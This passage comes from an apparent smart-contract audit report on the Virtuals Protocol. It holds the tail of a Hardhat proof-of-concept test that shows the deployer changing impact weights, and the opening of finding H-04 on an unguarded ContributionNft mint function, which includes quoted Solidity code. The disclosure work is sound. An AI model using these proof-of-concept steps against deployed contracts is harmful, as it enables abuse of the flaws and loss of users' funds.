10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry, service };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = event.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent application created with ID: ${id}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { applicationId: id, ...base };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithAgent() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployWithApplication();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, applicationId } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Executing application...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .executeApplication(applicationId, false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryFilter = agentFactory.filters.NewPersona;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvents = await agentFactory.queryFilter(factoryFilter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const factoryEvent = factoryEvents[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualId, token, veToken, dao, tba, lp } = await factoryEvent.args;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Agent created with virtualId: ${virtualId}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ...base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agent: {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        token,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        veToken,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        dao,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tba,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        lp,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      },\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  before(async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Increase timeout for all tests\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(60000);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit(\u0026quot;Unfair updateImpact\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agent, agentNft, virtualToken, service} = await loadFixture(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      deployWithAgent\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { trader, poorMan, founder, randomAddr, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Update the impact\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(trader).updateImpact(1n, 1n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Old - DATASET_SHARES=7000 # 70%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await service.datasetImpactWeight()).to.be.eq(7000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Change the datasetImpactWeight\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting to 8000\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(deployer).setDatasetImpactWeight(8000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(await service.datasetImpactWeight()).to.be.eq(8000n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Again updating impact should work\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await service.connect(trader).updateImpact(1n, 1n);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e});\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\" style=\"position:relative;\"\u003e\u003ca href=\"#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds\" aria-label=\"h 04 public contributionnftmint leads to cascading issues  loss of funds permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-54\"\u003e[H-04] Public \u003ccode\u003eContributionNft::mint\u003c/code\u003e leads to cascading issues / loss of funds\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-560\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-797\"\u003eaxelot\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-249\"\u003eDarkeEEandMe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-331\"\u003eLegend\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-49\"\u003embuba666\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-175\"\u003eRaOne\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-107\"\u003esergei2340\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe contributors are supposed to submit their proposals via frontend and it is assumed from the \u003ca href=\"https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework\"\u003edocs\u003c/a\u003e, that the frontend calls the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e function to mint as per the proposed proposal.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eContribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission\u0026#39;s origin.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e is un-gaurded, allowing proposers to mint their own NFTs.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewTokenURI\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparentId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisModel_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epersonaDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalProposer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Only proposal proposer can mint Contribution NFT\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        